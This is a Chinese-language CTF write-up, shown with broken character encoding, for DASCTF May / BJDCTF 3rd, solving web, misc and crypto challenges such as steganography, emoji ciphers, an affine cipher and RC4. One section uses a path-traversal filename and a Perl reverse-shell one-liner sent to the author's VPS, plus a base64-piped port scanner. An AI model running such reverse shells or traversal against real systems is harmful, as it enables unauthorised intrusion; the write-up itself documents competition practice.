> åŸæ–‡é“¾æ¥: https://www.anquanke.com//post/id/206493 


# DASCTFäº”æœˆæœˆèµ› æš¨ BJDCTF 3rd éƒ¨åˆ†WP


                                é˜…è¯»é‡ Â Â 
                                **238512**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t015c269280a114d98f.jpg)](https://p5.ssl.qhimg.com/t015c269280a114d98f.jpg)



è¿™é‡Œæ˜¯ä¸»è¦æ˜¯cryptoå’Œmiscéƒ¨åˆ†çš„wpã€‚



## WEB

### <a class="reference-link" name="gob"></a>gob

ç™»å½•ä¸‡èƒ½å¯†ç ç™»ï¼ˆå¥½åƒå¯ä»¥ç›´æ¥éšä¾¿è¾“ï¼Ÿï¼‰ç„¶åæ˜¯ä¸€ä¸ªä¸Šä¼ ç•Œé¢

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://i.loli.net/2020/05/23/RfcozNwBxLAv3Gq.png)

ä¸Šä¼ åæ˜“å¾—ä¸€ä¸ªäºŒçº§ç›®å½•uploadsï¼Œç„¶åçœ‹äº†çœ‹ç›®å½•é‡Œéƒ½æ˜¯å„ç§é©¬ï¼Œä½†æ˜¯å› ä¸ºä¸è§£ææ‰€ä»¥ä¸€ä¸ªéƒ½æ²¡ç”¨ã€‚ã€‚ã€‚

ä½†æ˜¯æ­¤æ—¶å‘ç°æ–‡ä»¶ä¸Šä¼ åæ–‡ä»¶åå¹¶æ²¡æœ‰è¢«æ›´æ”¹ï¼Œæ‰€ä»¥æ¨æµ‹show.phpæ–‡ä»¶åŒ…å«ä¹Ÿæ˜¯ç›´æ¥åŒ…å«çš„æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åï¼Œæ‰€ä»¥æ„é€ ä¸€ä¸ª`../../../../flag`æ–‡ä»¶è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œå†è®¿é—®å°±å¯ä»¥å¾—åˆ°flagçš„base64ï¼Œè§£å¯†å³ä¸ºflagï¼ˆPS:å¿…é¡»å¾—åœ¨åŒä¸€ä¸ªsessionä¸­ï¼‰

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://i.loli.net/2020/05/23/VG3YlUBnEWo9bJ4.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://i.loli.net/2020/05/23/kmSYPdNV4g6qeHM.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://i.loli.net/2020/05/23/vlax6wsF7CgcAVR.png)



## MISC

### <a class="reference-link" name="Questionnaire"></a>Questionnaire

F12è·å¾—flagï¼Œæ ‡å‡†ç­¾åˆ°é¢˜

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://i.loli.net/2020/05/23/SOJZixI9wepd6Ns.png)

```
null,null,null,null,[["1vV5T8FOS13NOQDji-xYIynLwsUMXcV8aatxUWP6ljvfz-w",null,[740,416,0]
]
]
]
,[603160739,"What is the name of the store?",null,0,[[539054317,null,0,null,[[4,302,["Haolinju|haolinju"]
,"8cd9"]
]
]
]
,null,null,null,null,[["1x4dT2M6J3EbaiVZ37ssMVunsnsB2UMCM6g4LCHyhlHJu-Q",null,[740,416,0]
]
]
]
,[488094967," What BRAND is this food?",null,0,[[1465781074,null,0,null,[[4,302,["Daoxiangcun|daoxiangcun"]
,"8f00b2"]
]
]
]
,null,null,null,null,[["1lH3bwgs28QoVKcUYhtzoqAcacmh4n4CHyWjGQen4RiE3Jw",null,[375,458,1]
]
]
]
,[1097246628,"Which RESTAURANT are the ducks coming from? ",null,0,[[353762320,null,0,null,[[4,302,["Jingweizhai|jingweizhai"]
,"04e9"]
]
]
]
,null,null,null,null,[["11ym4QgB0WEymoJXlmFy7FTC5Eyd5rV1adBbw6vWN5PmXvw",null,[740,555,0]
]
]
]
,[1916058196,"Which PARK is this?",null,0,[[901636349,null,0,null,[[4,302,["Jingshan|jingshan"]
,"8009"]
]
]
]
,null,null,null,null,[["16pfH3k5-5kDo-Rb9BxeKRvx0S-Qy4IgUdlX8iJ0AUOBIwQ",null,[740,554,0]
]
]
]
,[1044111735,"Which DISTRICT is the No.3 of Beijing?","The restaurant in question4 is in this Distric",0,[[1620980704,null,0,null,[[4,302,["Chaoyang|chaoyang"]
,"98ecf8"]
]
]
]
,null,null,null,null,[["1VbfGqSSHlM9D_HY1TsENa6rle3axBYbtKdyHS_klYDLG5g",null,[740,371,0]
]
]
]
,[1877231084,"Which part of the Great Wall is this?","In Huairou Distric",0,[[1337434564,null,0,null,[[4,302,["Hefangkou|hefangkou"]
,"427e"]
```

flagä¸ºç­”æ¡ˆåé¢æ‹¼èµ·æ¥çš„å­—ç¬¦ï¼šd41d8cd98f00b204e9800998ecf8427e

### <a class="reference-link" name="babyweb"></a>babyweb

æ‰“å¼€ç½‘å€ï¼Œä¸€å¼ å›¾ï¼Œä¸‹è½½zipï¼Œå¯†ç è¯´æ˜¯é‚£ä¸ªpassword_is_here

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://i.loli.net/2020/05/23/67DIfmYgjRL4cCN.png)

ç„¶åF12å‘ç°

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://i.loli.net/2020/05/23/9MsAQykx1nlDcdX.png)

äºæ˜¯æƒ³åˆ°å¯èƒ½æ˜¯å®½å­—èŠ‚éšå†™ï¼Œç„¶åæ‰¾åˆ°åœ¨çº¿å·¥å…·[ç½‘ç«™](https://offdev.net/demos/zwsp-steg-js)è§£å¯†ï¼Œå¾—åˆ°`zerowidthcharactersinvisible`ï¼Œè§£å‹åå¾—åˆ°ä¸€å¼ å€’å™çš„å›¾ï¼Œè„šæœ¬ä¸€æŠŠæ¢­

```
a = open('f14g.png','rb').read()
f = a[::-1]
b = open('flag.png','wb').write(f)
```

å¾—åˆ°ä¸€å †å¥‡æ€ªå­—ç¬¦

[![](https://i.loli.net/2020/05/23/7I9ohuP5EpLb31g.png)](https://i.loli.net/2020/05/23/7I9ohuP5EpLb31g.png)

å‰ä¸‰ä¸ªæ˜¯MINIMOYS, 4-6æ˜¯é“¶æ²³å¯†ç ï¼Œ7-9æ˜¯è·³èˆçš„å°äººï¼Œæœ€åä¸¤ä¸ªæ˜¯é¸Ÿå›¾è…¾

å¾—åˆ°

UVWHZAITWAU

æ‰€ä»¥flagï¼šMD5(â€˜BJD`{`UVWHZAITWAU`}`â€™)

### <a class="reference-link" name="/bin/cat%202"></a>/bin/cat 2

è¿›å»åæ˜¯ä¸€å¼ å¤§çš„å›¾ç‰‡ï¼Œé‡Œé¢æœ‰å¾ˆå¤š å°çš„å›¾ç‰‡ï¼Œå°çš„å›¾ç‰‡æœ‰ä¸¤ç§ã€‚

ç„¶åå¦‚æœå°†é¡µé¢ç¼©å°ï¼Œå¯ä»¥éšçº¦çœ‹åˆ°ä¸€ä¸ªäºŒç»´ç 

æ‰€ä»¥æ–¹æ³•ä¸€ï¼šå†™è„šæœ¬è„šæœ¬ï¼Œç„¶åç”ŸæˆäºŒç»´ç ï¼Œå†å°†å›¾ç‰‡æ›¿æ¢â€”â€”é•¿åº¦å‡ä¸€åŠï¼Œæ‰«äºŒç»´ç åmd5å³å¯

exp

```
from PIL import Image
from pyzbar.pyzbar import decode
import hashlib

p1 = Image.open('11.png').convert('RGB')    #ç¬¬ä¸€ç§ç±»å‹çš„å›¾ç‰‡
p2 = Image.open('12.png').convert('RGB')    #ç¬¬äºŒç§ç±»å‹çš„å›¾ç‰‡
a,b = p1.size
dif = []
for y in range(b):
    for x in range(a):
        if p1.getpixel((x,y))!=p2.getpixel((x,y)):
            dif.append((x,y))
mark = dif[0]

p = Image.open('res.png').convert('RGB')    #æœ€å¤§çš„ä¸€å¼ å›¾ç‰‡
aa,bb = p.size
data = []
for y in range(0,bb,50):
    for x in range(0,aa,100):
        if p.getpixel((x+mark[0],y+mark[1])) == p1.getpixel(mark):
            data.append('1')
        else:
            data.append('0')

B = Image.new('L',(10,10),255)
W = Image.new('L',(10,10),0)
np = Image.new('L',(290,290),0)
for y in range(29):
    for x in range(29):
        if data[x+29*y] == '0':
            np.paste(B,(10*x,10*y))
        else:
            np.paste(W,(10*x,10*y))
np.save('r.png')
pp = Image.open('r.png')
barcodes = decode(pp)
for barcode in barcodes:
    barcodeData = barcode.data.decode("utf-8")
    print(hashlib.md5(barcodeData.encode()).hexdigest())
```

æ–¹æ³•äºŒï¼šç›´æ¥æˆªå›¾ï¼Œç„¶åæ”¾è¿›Stegsolveï¼Œæ”¹ä¸€ä¸‹è‰²é“å¯ä»¥å¾—åˆ°

[![](https://i.loli.net/2020/05/24/k7LxYFi5AZMs9cz.jpg)](https://i.loli.net/2020/05/24/k7LxYFi5AZMs9cz.jpg)

ç„¶åæ”¹ä¸€ä¸‹å®½é«˜ï¼Œå°±èƒ½æ‰«å‡ºæ¥äº†ï¼ˆæ”¯ä»˜å®æ‰«ç èƒ½åŠ›æ¯”è¾ƒå¼ºï¼‰ã€‚

### <a class="reference-link" name="manual"></a>manual

é¦–å…ˆsshé“¾æ¥ï¼Œå¾—åˆ°

```
% ssh ctf@183.129.189.60 -p 10128

Welcome to BJD3rd Games ~

ğŸ€ğŸ¾ğŸŒ´ğŸšœğŸ‹ğŸŠğŸ‡ğŸ‚ğŸ“ğŸ‘ğŸˆğŸŸğŸ’ğŸšŸğŸ—

The above login passwd is encrypted.

leads:
 - http://emoji.taqini.space
 - suika

Try to figure out where is your

         #           #####   #####  
######  ##     ##   #     # #     #
#      # #    #  #  #     #       #
#####    #   #    #  ######    ###  
#        #   ######       #    #    
#        #   #    # #     #         
#      ##### #    #  #####     #    

p.s. Maybe you have lots of xiaowenhao after login,
     I will help u look up the manual pages of flag.

Now, input passwd to start the game:
```

ä¸Šé¢é‚£ä¸ªç½‘å€å°±æ˜¯è™ç¬¦miscä¸­çš„emojiæ›¿ä»£åŠ å¯†ï¼Œå¯†é’¥æ˜¯`suika`ï¼Œä»–æ˜¯ä¸€ç§æ›¿ä»£åŠ å¯†ï¼Œå»ç½‘å€å¾—åˆ°å­—å…¸åè„šæœ¬æ›¿ä»£å¾—åˆ°sshå¯†ç ï¼š`C0dEmOj!so4UnNy`

```
a = 'ğŸŒ·ğŸ‘±ğŸŒ ğŸŒ´ğŸ‘·ğŸ†ğŸ€ğŸ‘¼ğŸ‰ğŸ‡ğŸ‘°ğŸğŸ‹ğŸ’ğŸ‘ğŸğŸš¶ğŸğŸ“ğŸ’‘ğŸ€ğŸ„ğŸ’ªğŸ³ğŸ—ğŸ‘†ğŸ˜¶ğŸš˜ğŸ€ğŸ˜®ğŸšœğŸ»ğŸ˜´âš“ğŸ”ğŸ˜ğŸš¢ğŸ¥ğŸ˜•ğŸšŸğŸŠğŸ˜ğŸš¥ğŸ‰ğŸ˜­ğŸš½ğŸŸğŸ˜©âŒ›ğŸšğŸ˜³â˜€ğŸ˜œğŸ˜€ğŸš†ğŸˆğŸ˜„ğŸšŠğŸ´ğŸ˜ŠğŸšŒğŸ¾ğŸ‚ğŸªğŸšğŸ—ğŸ˜šğŸŒ¹ğŸš“ğŸğŸ˜‘ğŸš—ğŸ‘©ğŸ˜¥'
b = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+'
ss = 'ğŸ€ğŸ¾ğŸŒ´ğŸšœğŸ‹ğŸŠğŸ‡ğŸ‚ğŸ“ğŸ‘ğŸˆğŸŸğŸ’ğŸšŸğŸ—'
print(ss.translate(str.maketrans(a,b)))
```

ç™»å½•ä¸Šå»åæ˜¯ä¸€ä¸ªç•™è¨€æ¿åŠ ä¸Šä¸€ä¸ªè‡ªå¸¦çš„man flagæŒ‡ä»¤ï¼Œä½†æ˜¯ä½ ä¸èƒ½é€€å‡ºmanï¼Œé€€å‡ºmançš„è¯å°±ç›´æ¥é€€å‡ºäº†sshï¼Œä½†æ˜¯è¿™ä¸ªmanåˆä¸æ˜¯ä¸€èˆ¬çš„manï¼Œä»–æ˜¯w3mmanï¼Œç„¶åä¸Šé¢çš„`External Program Settings`ä¸­çš„`External browser`å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼ˆè¿™ç›¸å½“äºæ˜¯é»˜è®¤å¯åŠ¨é¡¹ï¼Œå¯ä»¥æ’å…¥æŒ‡ä»¤è®©å®ƒæ‰§è¡Œï¼‰ï¼Œä½¿ç”¨perlæ¥åå¼¹shellï¼Œäºæ˜¯æ„å»ºï¼ˆç½‘ä¸Šç™¾åº¦ï¼‰å¾—`perl -e 'use Socket;$i="ip addr";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))`{`open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");`}`;'`ï¼Œå°†shellåå¼¹åˆ°VPSä¸Šï¼Œç„¶åå¼€å§‹ç–¯ç‹‚æŸ¥çœ‹æ–‡ä»¶ä»¥åŠæƒé™ï¼Œå¾—åˆ°`f1a9.py`ä¸º700æƒé™ï¼Œhintåˆè¯´ä¸ç”¨ææƒï¼Œç„¶åçœ‹è§run.shé‡Œ

```
#!/bin/sh
echo "ctf:C0dEmOj!so4UnNy" | chpasswd
chown -R root:ctf /home/ctf/
chmod 700 /home/ctf/f1a9.py
chmod 750 /home/ctf/msh
/home/ctf/f1a9.py &amp;

/usr/sbin/sshd -D
```

å¯ä»¥çœ‹åˆ°f1a9.pyåœ¨å¯åŠ¨æ˜¯å°±åœ¨åå°è¿è¡Œäº†ï¼Œä½†æ˜¯ã€‚ã€‚ã€‚æˆ‘psæ€ä¹ˆå¼„ï¼Œè¿›å…¥`/proc`è¯»å†…å­˜éƒ½æ²¡æ‰¾åˆ°æœ‰ç”¨ä¿¡æ¯ï¼Œä½†æ˜¯å®˜æ–¹çªç„¶ç»™hintï¼š`f1a9.pyçš„ç‹¬ç™½ï¼šæˆ‘çš„çœŸå®èº«ä»½æ˜¯web server`,äºæ˜¯æ¶å‘èƒ†è¾¹ç”Ÿï¼Œä¿ºçˆ†ç ´ä½ ç«¯å£ï¼Œä½†æ˜¯åˆå› ä¸ºæœåŠ¡å™¨é‡Œæ²¡æœ‰nmapç­‰å¯ä»¥ä¸‰å¥è¯ä»£ç ï¼Œä½¿ç”¨pythonå†™è¿›å»ä¸€å¥è¯çš„æ‰«æç«¯å£è„šæœ¬

åŸç ï¼š

```
import requests
host = ' http://127.0.0.1'
for i in range(2000,2500):
    add = host+':'+str(i)
    try:
        s = requests.get(add)
        print(i)
        print(s.text)
        exit(1)
    except:
        print(i)
        pass
```

ä¸€å¥è¯è„šæœ¬ï¼š

```
echo aW1wb3J0IHJlcXVlc3RzCmhvc3QgPSAnIGh0dHA6Ly8xMjcuMC4wLjEnCmZvciBpIGluIHJhbmdlKDIwMDAsMjUwMCk6CiAgICBhZGQgPSBob3N0Kyc6JytzdHIoaSkKICAgIHRyeToKICAgICAgICBzID0gcmVxdWVzdHMuZ2V0KGFkZCkKICAgICAgICBwcmludChpKQogICAgICAgIHByaW50KHMudGV4dCkKICAgICAgICBleGl0KDEpCiAgICBleGNlcHQ6CiAgICAgICAgcHJpbnQoaSkKICAgICAgICBwYXNzCg== | base64 -d | python3
```

å¾—åˆ°äº†2333ç«¯å£æœ‰ç½‘é¡µï¼Œå…¶å†…å®¹ä¸ºä¸€å †base64ç¼–ç ï¼š

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://i.loli.net/2020/05/24/S6jkb9qFs2yhru4.png)

çœ‹åˆ°è¿™ä¹ˆå¤šbase64ï¼Œæœ‰å¯èƒ½å°±æ˜¯base64éšå†™ï¼Œè„šæœ¬ä¸€æŠŠæ¢­ï¼š

```
import base64
def get_base64_diff_value(s1,s2):
    table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    res = 0
    for i in range(len(s1)):
        if s1[i] != s2[i]:
            return abs(table.index(s1[i]) - table.index(s2[i]))
    return res

def solve():
    lines = open('stego.txt','r').readlines()
    bin_str = ''

    for line in lines:
        steg_line = line.replace('n','')
        # print(steg_line)
        norm_line = base64.b64encode(base64.b64decode(steg_line)).decode()
        # print(norm_line)
        diff = get_base64_diff_value(steg_line,norm_line)
        # print(diff)
        pad_num = steg_line.count('=')
        if diff:
            bin_str += bin(diff)[2:].zfill(pad_num*2)
        else:
            bin_str += '0' * pad_num * 2
    print(bin_str)
    res_str = ''
    for j in range(int(len(bin_str)/8)):
        # print(8*j,(j+1)*8)
        res_str+=chr(int(bin_str[8*j:(j+1)*8],2))
    print(res_str[-52:])
    print(base64.b64decode(res_str[-52:]))

solve()
```

å¾—åˆ°hTtP://999.TaQini.SpAcEï¼Œä¸Šå»åæ˜¯

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://i.loli.net/2020/05/23/VC6HvEDeI2PFWAy.png)

è¿™ç©æ„ï¼Œf12åå‘ç°æœ‰ä¸€å †å¥‡æ€ªçš„è¡¨æƒ…jsï¼š

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://i.loli.net/2020/05/24/lSd1q9EgKaILkDw.png)

ç½‘ä¸Šåœ¨çº¿è§£å¯†aaencodeå¾—åˆ°

```
/**
   * åŠå¾„ï¼Œç”»å¸ƒå®½åº¦ï¼Œç”»å¸ƒé«˜åº¦ï¼Œç”»å¸ƒxå†…è¾¹è·ï¼Œç”»å¸ƒyå†…è¾¹è·
   */
   var R = 26, canvasWidth = 400, canvasHeight = 320, OffsetX = 30, OffsetY = 30;
   var circleArr = [];
    function createCirclePoint(diffX, diffY) `{`
      for (var row = 0; row &lt; 3; row++) `{`
        for (var col = 0; col &lt; 3; col++) `{`
         // è®¡ç®—åœ†å¿ƒåæ ‡
          var Point = `{`
            X: (OffsetX + col * diffX + ( col * 2 + 1) * R),
            Y: (OffsetY + row * diffY + (row * 2 + 1) * R)
          `}`;
          circleArr.push(Point);
        `}`
      `}`
    `}`
    window.onload = function () `{`
      var canvas = document.getElementById("lockCanvas");
      canvasWidth = document.body.offsetWidth;//ç½‘é¡µå¯è§åŒºåŸŸå®½
      canvas.width = canvasWidth;
      canvas.height = canvasHeight;
      var ctx = canvas.getContext("2d");
      /**
       * æ¯è¡Œ3ä¸ªåœ†
       * OffsetXä¸ºcanvas xæ–¹å‘å†…è¾¹è·
       * */
      var X = (canvasWidth - 2 * OffsetX - R * 2 * 3) / 2;
      var Y = (canvasHeight - 2 * OffsetY - R * 2 * 3) / 2;

      createCirclePoint(X, Y);
      bindEvent(canvas, ctx);
      //CW=2*offsetX+R*2*3+2*X
      Draw(ctx, circleArr, [],null);
    `}`
    function Draw(ctx, circleArr, pwdArr,touchPoint) `{`
      var eight = ["å·½","é›¢","å¤","éœ‡","â˜¯","å…Œ","è‰®","å","ä¹¾"];
      if (pwdArr.length &gt; 0) `{`
        ctx.beginPath();
        for (var i = 0; i &lt; pwdArr.length; i++) `{`
          var pointIndex = pwdArr[i];
          ctx.lineTo(circleArr[pointIndex].X, circleArr[pointIndex].Y);
        `}`
        ctx.lineWidth = 10;
        ctx.strokeStyle = "#713fdf";
        ctx.stroke();
        ctx.closePath();
        if(touchPoint!=null)`{`
          var lastPointIndex=pwdArr[pwdArr.length-1];
          var lastPoint=circleArr[lastPointIndex];
          ctx.beginPath();
          ctx.moveTo(lastPoint.X,lastPoint.Y);
          ctx.lineTo(touchPoint.X,touchPoint.Y);
          ctx.stroke();
          ctx.closePath();
        `}`
      `}`
      for (var i = 0; i &lt; circleArr.length; i++) `{`
        var Point = circleArr[i];
        ctx.fillStyle = "#713fdf";
        ctx.beginPath();
        ctx.arc(Point.X, Point.Y, R, 0, Math.PI * 2, true);
        ctx.closePath();
        ctx.fill();
        ctx.fillStyle = "#ffffff";
        ctx.beginPath();
        ctx.arc(Point.X, Point.Y, R - 3, 0, Math.PI * 2, true);
        ctx.closePath();
        ctx.fill();
        // alert(Point.X+','+Point.Y)
        // var img = new Image();
        // img.src = "http://taqini.space/img/"+i+".png"; 
        // ctx.drawImage(img,Point.X-20,Point.Y-20,40,40);

        // if(pwdArr.indexOf(i)&gt;=0)`{`
        //   ctx.fillStyle = "#713fdf";
        //   ctx.beginPath();
        //   ctx.arc(Point.X, Point.Y, R -16, 0, Math.PI * 2, true);
        //   ctx.closePath();
        //   ctx.fill();
        // `}`

        ctx.font = '36px "å¾®è½¯é›…é»‘"';
        ctx.textBaseline = "bottom";
        ctx.fillStyle = "#000000";
        ctx.fillText(eight[i],Point.X-18,Point.Y+20);

      `}`
    `}`

    /**
     * è®¡ç®—é€‰ä¸­çš„å¯†ç  
     */
    function getSelectPwd(touches,pwdArr)`{`
      for (var i = 0; i &lt; circleArr.length; i++) `{`
        var currentPoint = circleArr[i];
        var xdiff = Math.abs(currentPoint.X - touches.pageX);
        var ydiff = Math.abs(currentPoint.Y - touches.pageY);
        var dir = Math.pow((xdiff * xdiff + ydiff * ydiff), 0.5);
        if(dir &gt; R || pwdArr.indexOf(i) &gt;= 0)
         continue;
         pwdArr.push(i);
         break;
      `}`
    `}`

    /**
     * ç»™ç”»å¸ƒç»‘å®šäº‹ä»¶
     */
    function bindEvent(canvas, ctx) `{`
      var pwdArr = [];
      var res;
      canvas.addEventListener("touchstart", function (e) `{`
        getSelectPwd(e.touches[0],pwdArr);
      `}`, false);
      canvas.addEventListener("touchmove", function (e) `{`
        e.preventDefault();
        var touches = e.touches[0];
        getSelectPwd(touches,pwdArr);
        ctx.clearRect(0,0,canvasWidth,canvasHeight);
        Draw(ctx,circleArr,pwdArr,`{`X:touches.pageX,Y:touches.pageY`}`);
      `}`, false);
      canvas.addEventListener("touchend", function (e) `{`
        ctx.clearRect(0,0,canvasWidth,canvasHeight);
        Draw(ctx,circleArr,pwdArr,null);
        // alert("å¯†ç ç»“æœæ˜¯ï¼š"+pwdArr.join(""));
        res = pwdArr.join("")
        if(res=="723048561")`{`
          alert("flag`{`c967db67a5e32fef9049499daadc19e8`}`");
        `}`else`{`
          location.reload();
        `}`
        res = ""
        pwdArr=[];
      `}`, false);
    `}`;
```

å¾—åˆ°flag



## Crypto

### <a class="reference-link" name="bbcrypto"></a>bbcrypto

```
# -*- coding:utf-8 -*-
import A,SALT
from itertools import *

def encrypt(m, a, si):
    c=""
    for i in range(len(m)):
        c+=hex(((ord(m[i])) * a + ord(next(si))) % 128)[2:].zfill(2)
    return c
if __name__ == "__main__":
    m = 'flag`{`********************************`}`'
    a = A
    salt = SALT
    assert(len(salt)==3)
    assert(salt.isalpha())
    si = cycle(salt.lower())
    print("æ˜æ–‡å†…å®¹ä¸ºï¼š")
    print(m)
    print("åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š")
    c=encrypt(m, a, si)
    print(c)
    #åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š
    #177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d
```

æ˜¯ä¸€ä¸ªç®€å•çš„ä»¿å°„å¯†ç ï¼Œc = ax+saltï¼ˆmod 128ï¼‰

å…¶ä¸­aå›ºå®šæœªçŸ¥ï¼Œsaltæ˜¯å˜åŒ–çš„ï¼Œä½†æ˜¯å‘¨æœŸåªæœ‰3

æˆ‘ä»¬çŸ¥é“flagçš„æ ¼å¼ï¼Œå¼€å¤´ä¸ºflag

æ‰€ä»¥æˆ‘ä»¬æ‹¿â€˜fâ€™å’Œâ€˜gâ€™æ¥è§£æ–¹ç¨‹ï¼Œæ­¤æ—¶ä¸¤ä¸ªæœªçŸ¥æ•°ï¼Œä¸¤æ¡æ–¹ç¨‹ï¼Œå®Œå…¨å¯è§£ã€‚

è§£å‡ºaåï¼Œå†ç”¨flagçš„â€˜lâ€™å’Œâ€˜aâ€™æ¥è§£saltçš„å¦å¤–ä¸¤ä¸ªå€¼

æœ€ç»ˆè§£å‡ºa = 57, salt = â€˜ahhâ€™

exp:

```
from Crypto.Util.number import *
c = '177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d'.decode('hex')
m = 'flag'

#c[0] = ord('f')*a + b
#c[3] = ord('g')*a + b
a=57
b1 = (0x17-ord('f')*a)%128
b2 = (0x74-ord('l')*a)%128
b3 = (0x01-ord('a')*a)%128

salt='ahh'
flag=''
index=0
for i in c:
    b = ord(salt[index%3])
    index+=1
    flag+=chr((ord(i)-b)*inverse(a,128)%128)
```

### <a class="reference-link" name="Encrypt_Img"></a>Encrypt_Img

```
from numpy import array
from PIL import Image
from secret import Key

Plaintext1 = "RC4IsInteresting"
Plaintext2 = "ThisIsAEasyGame"
cnt = 0


class RC4():
    def __init__(self, Key):
        self.S = [i for i in range(256)]
        self.K = [ord(Key[i % len(Key)])*2 for i in range(256)]
        self.I, self.J = 0, 0
        self.KSA()

    def KSA(self):
        for i in range(256):
            j = (i+self.K[i]+self.S[i]) % 256
            self.S[i], self.S[j] = self.S[j], self.S[i]

    def next(self):
        self.I = (self.I+1) % 256
        self.J = (self.J+self.S[self.I]) % 256
        self.S[self.J], self.S[self.I] = self.S[self.I], self.S[self.J]
        tmp = (self.S[self.J] + self.S[self.I]) % 256
        return self.S[tmp]


class Encrypt():
    def __init__(self, plain):
        global cnt
        cnt += 1
        self.rc4 = RC4(Key)
        self.testRC4(plain)
        flag_file = Image.open(r"flag.png")
        img = array(flag_file)
        self.enc(img)

    def testRC4(self, plain):
        ciphertext = 0
        for i in plain:
            ciphertext = (ciphertext &lt;&lt; 8)+ord(i) ^ self.rc4.next()
        print("ciphertext`{``}` = `{``}`".format(cnt, ciphertext))

    def enc(self, img):
        a, b, _ = img.shape
        for x in range(0, a):
            for y in range(0, b):
                pixel = img[x, y]
                for i in range(0, 3):
                    pixel[i] = pixel[i] ^ self.rc4.next()
                img[x][y] = pixel
        enc = Image.fromarray(img)
        enc.save("enc`{``}`.png".format(cnt))


Encrypt(Plaintext1)
Encrypt(Plaintext2)

# ciphertext1 = 12078640933356268898100798377710191641
# ciphertext2 = 79124196547094980420644350061749775
```

é¢˜ç›®ç”¨çš„æµå¯†ç æ˜¯ä¸€ä¸ªæ ‡å‡†RC4ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°é¢˜ç›®åŠ å¯†äº†Plaintext1å’Œflagçš„å›¾ç‰‡ï¼Œç„¶ååˆåŠ å¯†äº†Plaintext2å’Œflagçš„å›¾ç‰‡ã€‚

